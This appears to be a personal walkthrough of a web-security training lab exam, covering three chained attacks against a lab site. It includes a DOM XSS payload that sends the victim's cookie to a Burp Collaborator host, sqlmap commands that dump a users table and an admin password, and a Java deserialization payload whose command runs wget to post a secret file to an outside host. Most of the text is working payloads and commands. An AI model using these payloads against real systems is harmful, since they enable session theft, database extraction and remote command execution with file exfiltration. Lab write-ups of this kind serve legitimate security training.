2/23/2026

Lab ID
```
0a40000e0334b1a38136b70d005f00c8.web-security-academy.net
```

Email address
```
attacker@exploit-0a25008f03afb1c981a7b6a001da0089.exploit-server.net
```

exploit server
```
exploit-0a25008f03afb1c981a7b6a001da0089.exploit-server.net/exploit
```

burp collaborator
```
txuzhy5861vr9q9yb9yb2x0pigo7cx0m.oastify.com
```


search bar DOM Invader found eval(1)
potentially dangerous is the parentheses `()` so replace with backticks 

DOM-based XSS
Needed to break out of searchTerm. DOM Invader exploit was useless.
![Practice Exam 2-20260223211730855](Practice%20Exam%202-20260223211730855.png)

Replace `()` with backticks
```
qq"};alert`1`;//
```
![Practice Exam 2-20260223211849324](Practice%20Exam%202-20260223211849324.png)

payload
```
"}; location="https://dl2j5itsuljbxaxiztmvqho960cr0io7.oastify.com/?c="+document.cookie; //
```

URL encoded
```
https://0a40000e0334b1a38136b70d005f00c8.web-security-academy.net/search_results?find=%22%7D%3B+location%3D%22https%3A%2F%2Fdl2j5itsuljbxaxiztmvqho960cr0io7.oastify.com%2F%3Fc%3D%22%2Bdocument.cookie%3B+%2F%2F
```

Send the following to exploit server
```
<script>
location = "https://0a40000e0334b1a38136b70d005f00c8.web-security-academy.net/?find=%22%7D%3B+location%3D%22https%3A%2F%2Fdl2j5itsuljbxaxiztmvqho960cr0io7.oastify.com%2F%3Fc%3D%22%2Bdocument.cookie%3B+%2F%2F";
</script>
```


![Practice Exam 2-20260223212949701](Practice%20Exam%202-20260223212949701.png)
Got the victim's cookie
```
veA42qNYwLRECW07RMCPQjsU4yKYodrD
```


Stage 2
Advanced search > order param 
![Practice Exam 2-20260223213306014](Practice%20Exam%202-20260223213306014.png)

```
sqlmap -r sqli_request_2 --level=5 --risk=3 -p 'order' --batch --dbs
```

![Practice Exam 2-20260223214333146](Practice%20Exam%202-20260223214333146.png)

```
sqlmap -r sqli_request_2 --level=5 --risk=3 -p 'order' --batch --dbms=PostgreSQL -D public --tables
```
![Practice Exam 2-20260223214555132](Practice%20Exam%202-20260223214555132.png)

```
sqlmap -r sqli_request_2 --level=5 --risk=3 -p 'order' --batch --dbms=PostgreSQL -D public -T users --dump
```

![Practice Exam 2-20260223215214308](Practice%20Exam%202-20260223215214308.png)

Log in as `administrator:irzrq6x2nr7tvnrzeoy8`
![Practice Exam 2-20260223215247183](Practice%20Exam%202-20260223215247183.png)

paste admin-pref in cyberchef
Needed to url decode > base64 decode > gzip
So for the payload we need to reverse it like gzip > base64 encode > url encode
![Practice Exam 2-20260223215402982](Practice%20Exam%202-20260223215402982.png)

![Practice Exam 2-20260223215650960](Practice%20Exam%202-20260223215650960.png)

Correct payload to get flag
```
CommonsCollections4 'wget https://q5wwpvd5ey3ohnhvj668au8mqdw4kw8l.oastify.com --post-file=/home/carlos/secret'
```
![Practice Exam 2-20260223220116829](Practice%20Exam%202-20260223220116829.png)

![Practice Exam 2-20260223220145322](Practice%20Exam%202-20260223220145322.png)


